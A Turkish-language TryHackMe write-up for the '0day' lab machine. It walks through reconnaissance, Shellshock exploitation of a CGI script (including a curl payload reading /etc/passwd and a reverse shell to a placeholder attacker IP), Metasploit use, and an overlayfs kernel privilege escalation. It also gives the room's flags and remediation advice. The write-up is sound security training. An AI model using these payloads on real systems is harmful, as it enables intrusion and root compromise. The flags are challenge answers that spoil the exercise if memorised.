# 🐢 0day — TryHackMe Writeup

![Zorluk](https://img.shields.io/badge/Zorluk-Orta-orange)
![Kategori](https://img.shields.io/badge/Kategori-Web%20|%20Shellshock%20|%20Kernel%20Exploit-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Yazar:** Miraç Akkuş (LatenT)  
> **Tarih:** Mayıs 2026  
> **Oda:** [0day](https://tryhackme.com/room/0day)

---

## 📋 Yönetici Özeti

Bu write-up, **0day** makinesinin tam sömürülmesini belgelemektedir. İlk erişim için tarihi **Shellshock zafiyeti (CVE-2014-6271)** kullanılmış, ardından root için **Overlayfs Yerel Yetki Yükseltme (CVE-2015-1328)** uygulanmıştır. Odanın sloganı — *"Kasırga İçinde Bir Kaplumbağa Gibi Ubuntu'yu Sömür"* — `/secret` dizininde bulunan kaplumbağa resmine atıfta bulunur ve Bash'teki Shellshock zafiyetine işaret eder.

---

## 🛠️ Kullanılan Araçlar ve Teknolojiler

| Araç | Amaç |
|------|------|
| `nmap` | Ağ keşfi |
| `gobuster` | Dizin enumerasyonu |
| `nikto` | Web zafiyet taraması |
| `curl` | Shellshock sömürüsü |
| `msfconsole` | Metasploit sömürüsü |
| `searchsploit` | Exploit veritabanı araması |
| `gcc` | Kernel exploit derlemesi |

---

## 🔍 Aşama 1: Keşif ve Enumerasyon

### Ağ Taraması

```bash
nmap -sV -sC -T4 <HEDEF_IP>
```

### Bulgular

| Port | Durum | Servis | Versiyon |
|------|-------|--------|----------|
| 22/tcp | açık | SSH | OpenSSH 6.6.1p1 Ubuntu |
| 80/tcp | açık | HTTP | Apache httpd 2.4.7 (Ubuntu) |

### Dizin Enumerasyonu

```bash
gobuster dir -u http://<HEDEF_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Keşfedilen Dizinler:**

| Dizin | İçerik | Notlar |
|-------|--------|--------|
| `/admin` | Boş sayfa | Tavşan deliği |
| `/backup` | SSH özel anahtarı | Şifrelenmiş, kırıldı ancak kullanılmadı |
| `/img` | Avatar resimleri | Steganografi kontrol edildi, bulunamadı |
| `/secret` | Kaplumbağa resmi | **İpucu: "Kasırga İçinde Kaplumbağa" → Shellshock** |
| `/cgi-bin` | CGI scriptleri | **Saldırı vektörü** |

### Nikto Taraması

```bash
nikto -h http://<HEDEF_IP>
```

**Kritik Bulgu:** `/cgi-bin/` içinde Shellshock zafiyeti tespit edildi

---

## 🌐 Aşama 2: Shellshock Sömürüsü (CVE-2014-6271)

### Zafiyet Arka Planı

Shellshock, Bash'te manipüle edilmiş ortam değişkenleri aracılığıyla uzaktan kod yürütülmesine olanak tanıyan kritik bir zafiyettir. Bash, ortam değişkenlerinde tanımlanan fonksiyonları işlerken, fonksiyon tanımından sonraki komutları çalıştırır.

### CGI Script Keşfi

```bash
gobuster dir -u http://<HEDEF_IP>/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x cgi
```

**Sonuç:** `/cgi-bin/test.cgi` — "Hello World" döndürür

### Manuel Sömürü

**Komut Yürütme Testi:**

```bash
curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd;" \
     http://<HEDEF_IP>/cgi-bin/test.cgi
```

**Sonuç:** `/etc/passwd` başarıyla döküldü — Shellshock doğrulandı.

### Ters Kabuk (Manuel)

```bash
# Dinleyici
nc -lvnp 4444

# Sömürü
curl -A "() { :;}; /bin/bash -c '/bin/bash -i >& /dev/tcp/<SALDIRGAN_IP>/4444 0>&1'" \
     http://<HEDEF_IP>/cgi-bin/test.cgi
```

### Metasploit Sömürüsü

```bash
msfconsole -q

use exploit/multi/http/apache_mod_cgi_bash_env_exec
set LHOST <SALDIRGAN_IP>
set RHOSTS <HEDEF_IP>
set TARGETURI /cgi-bin/test.cgi
exploit
```

**Sonuç:** `www-data` olarak Meterpreter oturumu

---

## 🏴 Aşama 3: Kullanıcı Flag'i

```bash
cat /home/ryan/user.txt
```

**Kullanıcı Flag'i:** `THM{Sh3llSh0ck_r0ckz}`

---

## 🚀 Aşama 4: Yetki Yükseltme (CVE-2015-1328)

### Kernel Enumerasyonu

```bash
uname -a
```

**Sonuç:** `Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP`

### Exploit Araştırması

```bash
searchsploit linux kernel 3.13.0 overlayfs
```

**Bulgu:** CVE-2015-1328 — Overlayfs Yerel Yetki Yükseltme

### Exploit Hazırlığı

```bash
# Exploit indir
searchsploit -m linux/local/37292.c

# Hedefe yükle
meterpreter > cd /tmp
meterpreter > upload 37292.c

# Derle
gcc 37292.c -o ofs
```

### Exploit Yürütme

```bash
./ofs
```

**Çıktı:**
```
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

**Sonuç:** Root kabuğu elde edildi.

---

## 🏁 Aşama 5: Root Flag'i

```bash
cat /root/root.txt
```

**Root Flag'i:** `THM{g00d_j0b_0day_is_Pleased}`

---

## 🗺️ Saldırı Yolu Görselleştirmesi

```
[Saldırgan]
    │
    ├───nmap───► [Hedef: 22, 80]
    │                │
    │                ▼
    │        [gobuster: /admin, /backup, /secret, /cgi-bin]
    │                │
    │                ▼
    │        [/secret: kaplumbağa resmi → Shellshock ipucu]
    │                │
    │                ▼
    │        [nikto: Shellshock zafiyeti doğrulandı]
    │                │
    │                ▼
    │        [/cgi-bin/test.cgi]
    │                │
    │                ▼
    │        [Shellshock sömürüsü (CVE-2014-6271)]
    │                │
    │                ▼
    │        [www-data kabuğu]
    │                │
    │                ▼
    │        [Kullanıcı Flag'i: /home/ryan/user.txt]
    │                │
    │                ▼
    │        [uname -a: kernel 3.13.0]
    │                │
    │                ▼
    │        [Overlayfs sömürüsü (CVE-2015-1328)]
    │                │
    │                ▼
    │        [Root kabuğu]
    │                │
    │                ▼
    └────────► [Root Flag'i: /root/root.txt]
```

---

## 🛡️ Zafiyet Değerlendirmesi ve Çözümler

| # | Zafiyet | Şiddet | CVSS | Çözüm |
|---|---------|--------|------|-------|
| 1 | **Shellshock (CVE-2014-6271)** | 🔴 Kritik | 10.0 | Bash'i hemen güncelle; tüm sistemleri yamala; CGI gereksizse devre dışı bırak |
| 2 | **Overlayfs Yetki Yükseltme (CVE-2015-1328)** | 🔴 Kritik | 7.8 | Kernel'i yamalı versiyona güncelle; kernel canlı yama uygula |
| 3 | **Eski Ubuntu 14.04.1** | 🔴 Kritik | 9.8 | Desteklenen LTS versiyona yükselt; otomatik güvenlik güncellemeleri uygula |
| 4 | **CGI Script Maruziyeti** | 🟠 Yüksek | 7.5 | CGI erişimini kısıtla; mod_security kullan; WAF kuralları uygula |

---

## 🎓 Temel Çıkarımlar

1. **Shellshock Tarihi:** Şimdiye kadarki en kritik zafiyetlerden biri — milyonlarca sistemi etkiledi; Bash'i her zaman yamala
2. **CGI = Risk:** CGI scriptleri ortam değişkenlerini doğrudan işler — başlıca Shellshock hedefi
3. **Kernel Exploitleri:** Son derece güçlü ancak versiyona özel; her zaman `uname -a` kontrol et
4. **Overlayfs:** Linux kernel özelliği yetki yükseltme için istismar edildi — kernel'leri güncel tut
5. **Eski Sistemler:** Ubuntu 14.04.1 çok eski; EOL sistemler çalıştırmak saldırıya davetiye çıkarmaktır
6. **Kaplumbağa İpucu:** Oda açıklamaları ve resimler sıklıkla kritik ipuçları içerir — her zaman analiz et

---
---

## 🚩 Flag'ler

| Flag | Konum | Değer |
|------|-------|-------|
| **Kullanıcı Flag'i** | `/home/ryan/user.txt` | `THM{Sh3llSh0ck_r0ckz}` |
| **Root Flag'i** | `/root/root.txt` | `THM{g00d_j0b_0day_is_Pleased}` |

---

> **⚠️ Yasal Uyarı:** Bu write-up sadece eğitim ve araştırma amaçlıdır. Sahibi olmadığınız sistemleri test etmeden önce her zaman açık yazılı yetki alın.

---

**Yazar:** Miraç Akkuş (LatenT)  
**Tarih:** Mayıs 2026
```
